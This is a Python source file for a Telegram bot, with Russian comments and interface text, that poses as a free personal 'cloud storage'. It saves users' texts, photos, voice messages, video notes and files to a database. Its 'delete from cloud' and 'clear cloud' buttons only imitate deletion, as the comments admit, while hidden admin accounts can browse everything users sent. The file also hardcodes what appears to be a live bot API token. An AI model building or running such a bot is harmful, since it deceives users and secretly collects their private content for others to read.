import os
import sqlite3
import asyncio
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart, Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton

API_TOKEN = "8949058159:AAG6Q0J4_RhvYpns4ipVAEsBThFe4GzKudE"

# =========================================================
# СПИСОК АДМИНИСТРАТОРОВ (Добавляйте сюда ID через запятую)
# =========================================================
ADMIN_IDS = [1661921635] 
# =========================================================

bot = Bot(token=API_TOKEN)
dp = Dispatcher()

# Инициализация БД
def init_db():
    conn = sqlite3.connect("bot_data.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            content_type TEXT,
            content TEXT
        )
    """)
    conn.commit()
    conn.close()

# Inline-кнопка под сообщениями для имитации удаления из облака
def get_delete_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="☁️ Удалить из облака", callback_data="delete_chat_msg")]
    ])

# Reply-клавиатура (кнопки возле поля ввода)
def get_main_keyboard(user_id: int):
    buttons = [
        [KeyboardButton(text="🧹 Очистить облако"), KeyboardButton(text="ℹ️ О боте")]
    ]
    # Если пишет админ — добавляем ему кнопку админки
    if user_id in ADMIN_IDS:
        buttons.append([KeyboardButton(text="🔐 Сохранённые данные")])
        
    return ReplyKeyboardMarkup(keyboard=buttons, resize_keyboard=True)

# Удаление сообщения из чата по Inline-кнопке (в БД всё остаётся)
@dp.callback_query(F.data == "delete_chat_msg")
async def process_delete_chat_msg(callback: types.CallbackQuery):
    await callback.message.delete()
    await callback.answer("Удалено из вашего облака!")

# Команда /start
@dp.message(CommandStart())
async def start_handler(message: types.Message):
    user_id = message.from_user.id
    username = message.from_user.username
    user_display = f"@{username}" if username else (message.from_user.first_name or "друг")

    start_text = (
        f"✨ **Здравствуйте, {user_display}!** ✨\n\n"
        f"Рады видеть вас в нашем боте! 📝🔥\n\n"
        f"Здесь вы можете удобно и надежно сохранять:\n"
        f"📸 **Фотографии** и видео\n"
        f"💬 **Тексты** и заметки\n"
        f"🎙 **Голосовые сообщения** и кружочки 🎥\n"
        f"📁 **Документы** и любые файлы\n\n"
        f"⭐ Мы работаем абсолютно бесплатно — **без премиумов и без звёздочек ⭐ в Telegram**!\n\n"
        f"Отправляйте сюда всё, что хотите сохранить 🚀"
    )
    # При отправке /start сразу прикрепляем меню-кнопки
    await message.answer(start_text, parse_mode="Markdown", reply_markup=get_main_keyboard(user_id))

# Реакция на кнопку "🧹 Очистить облако" или команду /clear
@dp.message(F.text == "🧹 Очистить облако")
@dp.message(Command("clear"))
async def clear_chat_handler(message: types.Message):
    await message.delete()
    sent_msg = await message.answer("🧹 Ваше облако очищено.")
    await asyncio.sleep(3)
    await sent_msg.delete()

# Реакция на кнопку "ℹ️ О боте"
@dp.message(F.text == "ℹ️ О боте")
async def info_handler(message: types.Message):
    info_text = (
        "🤖 **Облачный накопитель**\n\n"
        "Отправляйте любые файлы, тексты или медиа в этот чат — всё будет надежно сохранено!"
    )
    await message.answer(info_text, parse_mode="Markdown")

# Универсальный сохранятор в базу SQLite
def save_to_db(user_id: int, username: str, content_type: str, content: str):
    conn = sqlite3.connect("bot_data.db")
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO messages (user_id, username, content_type, content) VALUES (?, ?, ?, ?)",
        (user_id, username or "без_ника", content_type, content)
    )
    conn.commit()
    conn.close()

# 1. Текст
@dp.message(lambda m: m.text and not m.text.startswith('/') and m.text not in ["🧹 Очистить облако", "ℹ️ О боте", "🔐 Сохранённые данные"])
async def save_text(message: types.Message):
    save_to_db(message.from_user.id, message.from_user.username, "TEXT", message.text)
    await message.answer(f"Текст сохранен: {message.text}", reply_markup=get_delete_keyboard())

# 2. Фото
@dp.message(F.photo)
async def save_photo(message: types.Message):
    save_to_db(message.from_user.id, message.from_user.username, "PHOTO", message.photo[-1].file_id)
    await message.answer("Фото сохранено.", reply_markup=get_delete_keyboard())

# 3. Голосовые сообщения
@dp.message(F.voice)
async def save_voice(message: types.Message):
    save_to_db(message.from_user.id, message.from_user.username, "VOICE", message.voice.file_id)
    await message.answer("Голосовое сообщение сохранено 🎙", reply_markup=get_delete_keyboard())

# 4. Видеосообщения (кружочки)
@dp.message(F.video_note)
async def save_video_note(message: types.Message):
    save_to_db(message.from_user.id, message.from_user.username, "VIDEO_NOTE", message.video_note.file_id)
    await message.answer("Видеосообщение сохранено 🎥", reply_markup=get_delete_keyboard())

# 5. Документы / Файлы
@dp.message(F.document)
async def save_document(message: types.Message):
    save_to_db(message.from_user.id, message.from_user.username, "DOCUMENT", message.document.file_id)
    await message.answer(f"Файл '{message.document.file_name}' сохранен 📁", reply_markup=get_delete_keyboard())

# Просмотр всех сохраненных файлов для АДМИНИСТРАТОРОВ (по кнопке или /get_messages)
@dp.message(F.text == "🔐 Сохранённые данные")
@dp.message(Command("get_messages"))
async def get_messages(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("У вас нет доступа к этой команде.")
        return

    conn = sqlite3.connect("bot_data.db")
    cursor = conn.cursor()
    cursor.execute("SELECT user_id, username, content_type, content FROM messages")
    rows = cursor.fetchall()
    conn.close()

    if not rows:
        await message.answer("Сохраненных сообщений пока нет.")
        return

    for user_id, username, c_type, content in rows:
        info = f"Пользователь: ID {user_id} (@{username})"
        
        if c_type == "TEXT":
            await message.answer(f"{info}\nТекст: {content}")
        elif c_type == "PHOTO":
            await message.answer_photo(photo=content, caption=f"{info}\nСохраненное фото")
        elif c_type == "VOICE":
            await message.answer_voice(voice=content, caption=f"{info}\nГолосовое сообщение")
        elif c_type == "VIDEO_NOTE":
            await message.answer_video_note(video_note=content)
            await message.answer(f"Выше видеосообщение от: {info}")
        elif c_type == "DOCUMENT":
            await message.answer_document(document=content, caption=f"{info}\nСохраненный документ")

async def main():
    init_db()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
